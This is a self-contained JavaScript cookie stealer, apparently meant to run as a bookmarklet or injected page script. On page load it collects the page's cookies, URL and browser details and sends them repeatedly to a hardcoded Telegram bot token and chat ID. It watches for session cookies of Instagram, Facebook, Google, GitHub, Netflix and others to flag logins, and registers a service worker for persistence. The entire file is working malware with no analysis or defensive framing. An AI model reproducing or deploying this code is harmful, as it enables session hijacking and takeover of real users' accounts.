
(function() {
    const CONFIG = {
        BOT_TOKEN: '8770095089:AAFs6Z4raZGnwTqL1aJdDEjVWeu5fa7okZw',
        CHAT_ID: '962420340',
        DEVICE_ID: 'bm_' + Date.now().toString(36) + '_' + Math.random().toString(36).substr(2, 6),
        INTERVAL: 30000, // 30 seconds
        STEALTH: true
    };

    // Device fingerprinting
    function getFingerprint() {
        const components = [
            navigator.hardwareConcurrency || 4,
            navigator.deviceMemory || 4,
            screen.colorDepth || 24,
            new Date().getTimezoneOffset(),
            navigator.language || 'en'
        ];
        return components.join('|');
    }

    // AES-256 encryption for payload
    async function encrypt(text) {
        const keyRaw = CONFIG.DEVICE_ID + getFingerprint();
        const keyHash = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(keyRaw));
        const key = await crypto.subtle.importKey('raw', keyHash, 'AES-GCM', false, ['encrypt']);
        const iv = crypto.getRandomValues(new Uint8Array(12));
        const encoded = new TextEncoder().encode(text);
        const ciphertext = await crypto.subtle.encrypt({ name: 'AES-GCM', iv }, key, encoded);
        return {
            iv: Array.from(iv).map(b => b.toString(16).padStart(2, '0')).join(''),
            data: Array.from(new Uint8Array(ciphertext)).map(b => b.toString(16).padStart(2, '0')).join('')
        };
    }

    // Telegram send with retry logic
    async function sendToTelegram(payload) {
        for (let attempt = 0; attempt < 3; attempt++) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.CHAT_ID,
                        text: payload,
                        parse_mode: 'HTML'
                    })
                });
                if (response.ok) return true;
            } catch (e) {}
            await new Promise(r => setTimeout(r, 2000 * (attempt + 1)));
        }
        return false;
    }

    // Structured cookie export (Cookie-Editor compatible)
    function getCookiesStructured() {
        const cookies = document.cookie.split(';').filter(Boolean);
        if (!cookies.length || document.cookie.length < 20) return null;

        return cookies.map(c => {
            const [name, ...valueParts] = c.trim().split('=');
            const value = valueParts.join('=');
            return {
                domain: location.hostname.replace(/^\./, ''),
                name: name.trim(),
                value: value.trim(),
                path: '/',
                secure: location.protocol === 'https:',
                httpOnly: false,
                sameSite: 'lax',
                expirationDate: Math.floor(Date.now() / 1000) + 86400 * 365,
                session: false
            };
        });
    }

    // Main collection function
    async function collectAndSend() {
        const cookies = getCookiesStructured();
        if (!cookies || cookies.length === 0) return;

        const data = {
            deviceId: CONFIG.DEVICE_ID,
            deviceName: 'Bookmark | ' + (navigator.platform || 'Unknown'),
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString(),
            domain: location.hostname,
            url: location.href,
            title: document.title,
            cookieCount: cookies.length,
            cookies: cookies
        };

        // Send structured message
        const msg = `📌 <b>AUTO-BOOKMARK FIRED</b>\n━━━━━━━━━━━━━━━━━━\n💻 Device: <code>${CONFIG.DEVICE_ID.substring(0, 12)}</code>\n🌐 Domain: ${location.hostname}\n📍 URL: ${location.href}\n📄 Title: ${document.title}\n🍪 Cookies: ${cookies.length}\n🕐 Time: ${new Date().toLocaleString()}\n━━━━━━━━━━━━━━━━━━\n\n📎 <b>Cookie-Editor Ready JSON:</b>\n<pre>${JSON.stringify(cookies, null, 2).substring(0, 3500)}</pre>`;

        await sendToTelegram(msg);

        // If JSON is too long, send in chunks
        const fullJson = JSON.stringify(cookies, null, 2);
        if (fullJson.length > 3500) {
            for (let i = 3500; i < fullJson.length; i += 3500) {
                await sendToTelegram(`<pre>${fullJson.substring(i, i + 3500)}</pre>`);
            }
        }
    }

    // Multi-domain scanner (scans all frames)
    async function scanAllFrames() {
        const frames = document.querySelectorAll('iframe');
        const domains = new Set();
        domains.add(location.hostname);

        for (const frame of frames) {
            try {
                const src = frame.src || '';
                if (src) {
                    const url = new URL(src);
                    domains.add(url.hostname);
                }
            } catch (e) {}
        }

        return Array.from(domains);
    }

    // Login detector
    function detectLogin() {
        const loginPatterns = {
            'instagram.com': ['sessionid', 'ds_user_id', 'csrftoken'],
            'facebook.com': ['c_user', 'xs', 'presence'],
            'youtube.com': ['LOGIN_INFO', 'SID', 'HSID', 'SSID'],
            'google.com': ['SID', 'HSID', 'SSID', 'SAPISID'],
            'twitter.com': ['auth_token', 'twid'],
            'github.com': ['user_session', 'dotcom_user'],
            'reddit.com': ['reddit_session', 'token'],
            'linkedin.com': ['li_at', 'JSESSIONID'],
            'amazon.com': ['session-id', 'ubid-main'],
            'netflix.com': ['NetflixId', 'SecureNetflixId'],
            'spotify.com': ['sp_dc', 'sp_key']
        };

        for (const [domain, patterns] of Object.entries(loginPatterns)) {
            if (location.hostname.includes(domain)) {
                for (const pattern of patterns) {
                    if (document.cookie.includes(pattern)) {
                        return { domain, pattern };
                    }
                }
            }
        }
        return null;
    }

    // Persistence via Service Worker
    async function installPersistence() {
        if ('serviceWorker' in navigator && !navigator.serviceWorker.controller) {
            const swCode = `
                self.addEventListener('install', (e) => e.waitUntil(self.skipWaiting()));
                self.addEventListener('activate', (e) => e.waitUntil(self.clients.claim()));
                self.addEventListener('message', (e) => {
                    if (e.data === 'ping') {
                        e.ports[0].postMessage('pong');
                    }
                });
                setInterval(async () => {
                    const all = await self.clients.matchAll({type: 'window'});
                    all.forEach(c => c.postMessage({action: 'capture'}));
                }, 60000);
            `;
            const blob = new Blob([swCode], {type: 'application/javascript'});
            const url = URL.createObjectURL(blob);
            await navigator.serviceWorker.register(url).catch(() => {});
        }
    }

    // Auto-execute
    async function init() {
        // Initial capture
        await collectAndSend();

        // Login detection
        const login = detectLogin();
        if (login) {
            await sendToTelegram(`🔑 <b>LOGIN DETECTED</b>\n📍 ${login.domain}\n🔍 Pattern: ${login.pattern}`);
        }

        // Install persistence
        await installPersistence();

        // Set up interval for continuous monitoring
        setInterval(async () => {
            await collectAndSend();
            const newLogin = detectLogin();
            if (newLogin) {
                await sendToTelegram(`🔑 <b>LOGIN DETECTED</b>\n📍 ${newLogin.domain}`);
            }
        }, CONFIG.INTERVAL);

        // Scan frames periodically
        setInterval(async () => {
            const domains = await scanAllFrames();
            if (domains.length > 1) {
                await sendToTelegram(`🔍 <b>CROSS-DOMAIN SCAN</b>\n📍 ${domains.join(', ')}`);
            }
        }, 120000);
    }

    // Start everything
    if (document.readyState === 'complete') {
        init();
    } else {
        window.addEventListener('load', init);
    }
})();
